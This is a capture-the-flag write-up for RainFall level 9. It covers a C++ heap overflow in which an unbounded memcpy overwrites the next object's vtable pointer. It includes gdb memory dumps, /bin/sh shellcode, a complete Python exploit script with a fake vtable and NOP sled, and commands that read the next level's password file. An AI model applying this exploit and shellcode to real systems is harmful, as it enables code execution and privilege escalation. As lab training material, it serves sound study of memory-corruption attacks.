# Level 9

For the first time, we have a C++ executable, so it is a bit trickier as things get mangled a little bit.
The program allocates two instances of the class `N`. The class contains an integer and a char array.

In the function setAnnotation, we will memcpy the entirety of our argv[1] into this char array.


We can override the vtable of the next object, the table that contains the object's methods,  replacing it with addresses to a  shell code in a  memory region we control, also adding a nope slide for extra piece of mind.
Let's get the address of the first object and check what it looks like in memory
```shell
level9@RainFall:~$ ltrace ./level9 ""
_Znwj(108, 0xbffff7d4, 0xbffff7e0, 0xb7d79e55, 0xb7fed280)      = 0x804a008
_Znwj(108, 5, 0xbffff7e0, 0xb7d79e55, 0xb7fed280)               = 0x804a078
[...]
+++ exited (status 11) +++
level9@RainFall:~$ gdb ./level9
(gdb) b *main+164
(gdb) r "BBBBaaaaBBBBaaaaa"
Breakpoint 1, 0x08048698 in main ()
(gdb) x/60x 0x804a008
0x804a008:      0x08048848      0x42424242      0x61616161      0x42424242
0x804a018:      0x61616161      0x00000061      0x00000000      0x00000000
0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d8:      0x00000000      0x00000000      0x00000006      0x00020f21
0x804a0e8:      0x00000000      0x00000000      0x00000000      0x00000000
```
Above we can see the vtable at the start of the first and second object, we can also see the value of `int x` near it's end.

We can confirm that the first object will overflow on the second's vtable after 108 bytes
```shell
(gdb) r $(python -c 'print "a"*108')
Starting program: /home/user/level9/level9 $(python -c 'print "a"*108')
Breakpoint 2, 0x08048698 in main ()
(gdb) x/40x 0x804a008
0x804a008:      0x08048848      0x61616161      0x61616161      0x61616161
0x804a018:      0x61616161      0x61616161      0x61616161      0x61616161
0x804a028:      0x61616161      0x61616161      0x61616161      0x61616161
0x804a038:      0x61616161      0x61616161      0x61616161      0x61616161
0x804a048:      0x61616161      0x61616161      0x61616161      0x61616161
0x804a058:      0x61616161      0x61616161      0x61616161      0x61616161
0x804a068:      0x61616161      0x61616161      0x61616161      0x61616161
0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000

```

Shellcode from [shell-storm.org](https://shell-storm.org/shellcode/files/shellcode-811.html): "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

t's now time to craft our exploit, we'll write our own vtable only consisting of the address of our shellcode that's coming up next, followed by a nop slide and then our shell code, right before the address of our fake vtable overwrighting the next one's.

It will look like this:
our fake vtable (start of shellcode `0x804A05C` * 8) -> 32bytes | padding (NOP `0x90`*48) -> 48bytes | shellcode -> 28 bytes | = 108 bytes, replacing 2nd obj vtable with ours at `0x804a00C`


Let's put it together in python
```python
#!/usr/bin/python
destination="\x0c\xa0\x04\x08"
start_of_shellcode="\x5c\xa0\x04\x08"
vtable=start_of_shellcode*8
padding="\x90"*0x30
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print vtable + padding + shellcode + destination
```

```shell
# On host machine:
scp -P 4242 Resources/exploit.py level9@$RAIN:/tmp/exploit.py

# On the Rainfall VM:
chmod +x /tmp/exploit.py
./level9 $(/tmp/exploit.py)
$ cat /home/user/bonus0/.pass
[redacted]
```
